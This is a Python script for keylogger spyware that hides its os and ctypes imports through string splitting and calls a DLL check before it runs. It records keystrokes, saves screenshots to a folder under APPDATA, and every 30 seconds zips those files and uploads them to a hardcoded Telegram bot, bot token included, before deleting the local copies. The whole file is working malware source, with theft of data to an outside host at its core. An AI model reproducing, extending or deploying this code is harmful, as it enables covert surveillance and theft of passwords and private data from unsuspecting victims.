
import time
import shutil
import importlib
import threading
from src.keylogger import Keylogger, SysInfo
from src.tg_sender import InfoToEmail
from src.path_management import VerificationPath


blabla = ['o'+'s',''.join(['ct','y','pes'])]

o = importlib.import_module(blabla[0])
c = importlib.import_module(blabla[1])

lib = c.CDLL(r"src\syscall.dll")

Get_InfoRessource = lib.main
Get_InfoRessource.restype = c.c_bool

result = Get_InfoRessource()

if result == False:
    exit()

log_file_name = "keylogger.txt"
sys_info_create_file = SysInfo(log_file_name, None)
log_file = sys_info_create_file.os_information()
print(log_file)
kl = Keylogger(log_file)
kl.start_()  


bot_token = "8007935776:AAFXs9GEcW8ecMManDe0bsV_vJNY0mjU5ug"
chat_id = "-1002421310280"
url = f"https://api.telegram.org/bot{bot_token}/sendDocument"

path_temp = o.path.abspath(o.path.dirname(__file__))
path = VerificationPath.path_verification(path_temp)

shifu_logger = InfoToEmail(url, path, log_file, chat_id)

screen_file_name = "screenshot_folder"


base_dir = o.path.join(o.getenv("APPDATA"), "ShifuScreener")
o.makedirs(base_dir, exist_ok=True)


screenshot_folder = o.path.join(base_dir, "screenshot_folder")
o.makedirs(screenshot_folder, exist_ok=True)
sc = SysInfo(None, screenshot_folder)
thread_for_screener =threading.Thread(target=sc.screen_shot, daemon=True)
thread_for_screener.start()



while True:
    if log_file:
        time.sleep(30)
        
        thread_for_keylog_sending = threading.Thread(target=shifu_logger.sender_file, daemon=True)
        thread_for_keylog_sending.start()
        
        zip_file_path_temp = shutil.make_archive(screenshot_folder, 'zip', screenshot_folder)
        print(zip_file_path_temp)
        zip_file_path = VerificationPath.path_verification(zip_file_path_temp)
        print(zip_file_path)
        shifu_screener = InfoToEmail(url, path, zip_file_path, chat_id) # Update the zip file path
        
        kl.pause()
        sc.pause()
        
        thread_for_screen_sending = threading.Thread(target=shifu_screener.sender_file, daemon=True)
        thread_for_screen_sending.start()
        thread_for_screen_sending.join()
        
        
        time.sleep(5)
        
        #cleaning files
        try:
            if o.path.exists(log_file):
                o.remove(log_file)
                
            if o.path.exists(screenshot_folder):
                shutil.rmtree(screenshot_folder)
            
            if o.path.exists(zip_file_path_temp):
                o.remove(zip_file_path_temp)
            

            o.makedirs(screenshot_folder, exist_ok=True)

        except Exception as e:
            pass
        
        ###we creat an other time files
        log_file_name = "keylogger.txt"
        ys_info_create_file = SysInfo(log_file_name, None)
        log_file = sys_info_create_file.os_information()
        ###
        
        kl.resume()
        sc.resume()
        
        
        


           
